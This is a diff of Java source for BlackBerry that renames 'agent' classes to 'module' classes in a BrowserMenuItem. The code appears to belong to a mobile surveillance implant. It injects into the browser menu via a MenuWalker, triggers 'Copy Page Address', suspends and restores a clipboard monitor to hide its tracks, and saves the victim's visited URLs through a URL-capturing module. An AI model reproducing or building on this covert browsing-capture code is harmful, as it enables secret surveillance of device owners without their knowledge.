@@ -15,11 +15,11 @@ import net.rim.device.api.system.Clipboard;
 import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.Device;
-import blackberry.agent.ClipBoardAgent;
-import blackberry.agent.UrlAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
+import blackberry.module.ModuleClipboard;
+import blackberry.module.ModuleUrl;
 import blackberry.utils.Utils;
 
 public class BrowserMenuItem extends ApplicationMenuItem {
@@ -35,7 +35,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
     String lastUrl;
 
     Thread menuThread;
-    UrlAgent agent;
+    ModuleUrl agent;
     private long bbmid;
 
     public static BrowserMenuItem getInstance() {
@@ -71,9 +71,9 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             if (Device.getInstance().atLeast(6, 0)) {
                 boolean ret = MenuWalker.walk("Copy Page Address");
                 if (ret) {
-                    ClipBoardAgent.getInstance().suspendClip();
+                    ModuleClipboard.getInstance().suspendClip();
                     String url = (String) Clipboard.getClipboard().get();
-                    ClipBoardAgent.getInstance().setClip(url);
+                    ModuleClipboard.getInstance().setClip(url);
                     if (url != null) {
                         //#ifdef DEBUG
                         debug.trace("run, 6.0, URL FOUND:" + url);
@@ -166,7 +166,7 @@ public class BrowserMenuItem extends ApplicationMenuItem {
             //#endif
 
             if (agent == null) {
-                agent = UrlAgent.getInstance();
+                agent = ModuleUrl.getInstance();
             }
 
             agent.saveUrl(url);
